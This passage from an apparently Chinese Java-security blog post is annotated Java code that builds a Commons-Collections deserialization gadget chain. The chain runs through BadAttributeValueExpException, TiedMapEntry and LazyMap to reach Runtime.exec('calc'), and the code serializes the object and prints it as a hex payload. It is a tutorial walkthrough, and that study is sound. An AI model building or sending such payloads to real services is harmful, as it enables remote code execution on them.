1、调用chainedTransformer.transform(key),跑完整条变换流水线  </span></span><br><span class="line">        <span class="comment">// 2、把transform执行之后得到的结果放进innerMap  </span></span><br><span class="line">        <span class="comment">// 3、返回这个执行后的结果  </span></span><br><span class="line">  </span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;testkey&quot;</span>);  </span><br><span class="line">        <span class="comment">/*  </span></span><br><span class="line"><span class="comment">        TideMapEntry源码关键重写了toSting()：  </span></span><br><span class="line"><span class="comment">         public String toString()</span></span><br><span class="line"><span class="comment">         &#123;</span></span><br><span class="line"><span class="comment">                return this.map.get(this.key).toString();</span></span><br><span class="line"><span class="comment">         &#125;         </span></span><br><span class="line"><span class="comment">         只要调用entry.toString()-&gt;自动执行lazyMap.get(&quot;testkey&quot;)</span></span><br><span class="line"><span class="comment">         -&gt;触发transform  </span></span><br><span class="line"><span class="comment">         这是二层跳板。  </span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="comment">//=====================================================================================</span></span><br><span class="line">        <span class="comment">// 第四块：入口类 BadAttributeValueExpException + 反射改 val</span></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">bad</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">        <span class="comment">// 先new一个对象，构造参数只是初始化val为字符串&quot;aaa&quot;，后面我们要覆盖掉val  </span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">valField</span> <span class="operator">=</span> BadAttributeValueExpException.class.getDeclaredField(<span class="string">&quot;val&quot;</span>);  </span><br><span class="line">        <span class="comment">// val是BadAttributeValueExpException的私有成员变量  </span></span><br><span class="line">        valField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="comment">// setAccessible(true):关闭检查权限，暴力读写private字段  </span></span><br><span class="line">        valField.set(bad,entry);  </span><br><span class="line">        <span class="comment">// valField.set(bad,entry):把bad.val从原来的字符串，替换成我们造好的TiedMapEntry对象！  </span></span><br><span class="line">        <span class="comment">// 即：现在 bad.val = TideMapEntry(lazyMap,&quot;testkey&quot;)  </span></span><br><span class="line">        <span class="comment">/* BadAttributeValueExpExcrption.readObject()大致原生逻辑：  </span></span><br><span class="line"><span class="comment">          peivate void readObject(ObjecrInputStream ois) throws IOException,          </span></span><br><span class="line"><span class="comment">          ClassNotFoundException &#123;              </span></span><br><span class="line"><span class="comment">          ois.defaultReadObject();              </span></span><br><span class="line"><span class="comment">          val.toString(); ----反序列化的时候，自动执行val.toString(),整体启动开关  </span></span><br><span class="line"><span class="comment">          &#125;         </span></span><br><span class="line"><span class="comment">          */</span>  </span><br><span class="line">        <span class="comment">// ==============================================================    </span></span><br><span class="line">        <span class="comment">/*        整条链：  </span></span><br><span class="line"><span class="comment">         -&gt;ois.readObject()         </span></span><br><span class="line"><span class="comment">         -&gt;BadAttributeValueExpException.readObject()         </span></span><br><span class="line"><span class="comment">         -&gt;val.toString  这里的val被改成TideMapEntry  </span></span><br><span class="line"><span class="comment">         -&gt;TideMapEntry.toString()         </span></span><br><span class="line"><span class="comment">         -&gt;lazyMap。get(&quot;testkey&quot;)  </span></span><br><span class="line"><span class="comment">         -&gt;LazyMap里面没有testkey，执行chainedTransformer(key)  </span></span><br><span class="line"><span class="comment">         -&gt;链式Transformer依次执行：  </span></span><br><span class="line"><span class="comment">         （&quot;testkey&quot; →【Constant】→ Runtime.class →【getMethod】</span></span><br><span class="line"><span class="comment">         → getRuntime 方法  </span></span><br><span class="line"><span class="comment">         →【invoke】→ Runtime 实例 →【exec】→ Runtime.exec(&quot;calc&quot;)）  </span></span><br><span class="line"><span class="comment">         -&gt;返回进程  </span></span><br><span class="line"><span class="comment">        */</span>  </span><br><span class="line">        <span class="comment">//------------------------------------------------------------------               </span></span><br><span class="line">        <span class="comment">// 第五块:序列化，生成payload  </span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();  </span><br><span class="line">        <span class="comment">// 前面有讲，把数据存在byte数组里面,这里就是bos，一个容器，里面封装了一个动态扩容的byte数组  </span></span><br><span class="line">        <span class="comment">// 值得注意的是bos只是容器，不能直接当字节数组读，所以有后面的byte[] payload = bos.toByteArray();  </span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bos);  </span><br><span class="line">        <span class="comment">// 用于把java对象序列化输出流,指定oos输出内容存入bos  </span></span><br><span class="line">  </span><br><span class="line">        oos.writeObject(bad);  </span><br><span class="line">        <span class="comment">//把我们构造好的BadAttributeValueExpException 对象（bad）序列化为二进制，然后存入bos里面  </span></span><br><span class="line">        oos.close();  </span><br><span class="line">        <span class="type">byte</span>[] <span class="variable">payload</span> <span class="operator">=</span> bos.toByteArray();  </span><br><span class="line">        <span class="comment">//把bos里的字节取出来，给payload这个标准字节数组，  </span></span><br><span class="line">  </span><br><span class="line">        <span class="comment">//输出payload,打印成十六进制格式  </span></span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sd</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();  </span><br><span class="line">        <span class="comment">// StringBuilder：可变字符串容器  </span></span><br><span class="line">        <span class="comment">// 普通字符串String不可变，每次都会新建字符串对象，因为这里payload实际是很长的，用String的话效率太低  </span></span><br><span class="line">        <span class="comment">// StringBuilder可以不断往后追加内容，不会反复新建对象  </span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">byte</span> b : payload) &#123;  </span><br><span class="line">            sd.append(String.format(<span class="string">&quot;%02x&quot;</span>,b));  </span><br><span class="line">            <span class="comment">// 02：不足两位的时候，前面补 0。比如字节 0x0a -&gt;输出 0a，而不是 a</span></span><br><span class="line">            <span class="comment">// Java 里byte 是有符号的负数，format 内部会自动处理，输出正确的两位hex。 </span></span><br><span class="line">            <span class="comment">// sd.append(...),把转好的两位十六进制字符，追加到 sd 里面,  </span></span><br><span class="line">            <span class="comment">// 坏了连这个都不知道，暴露java低陋的水平功底了  </span></span><br><span class="line">        &#125;  </span><br><span class="line">        System.out.println(<span class="string">&quot;CC6 payload:\n&quot;</span> + sd);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//==========================================================  </span></span><br><span class="line">        <span class="comment">//本地验证  </span></span><br><span class="line">        <span class="comment">/*  </span></span><br><span class="line"><span class="comment">        ByteArrayInputStream bis = new ByteArrayInputStream(payload);</span></span><br><span class="line"><span class="comment">        ObjectInputStream ois = new ObjectInputStream(bis);</span></span><br><span class="line"><span class="comment">        ois.readObject();        </span></span><br><span class="line"><span class="comment">        ois.close();        </span></span><br><span class="line"><span class="comment">         */</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
       <categories>
         <category>技术</category>
         <category>JAVA安全</category>
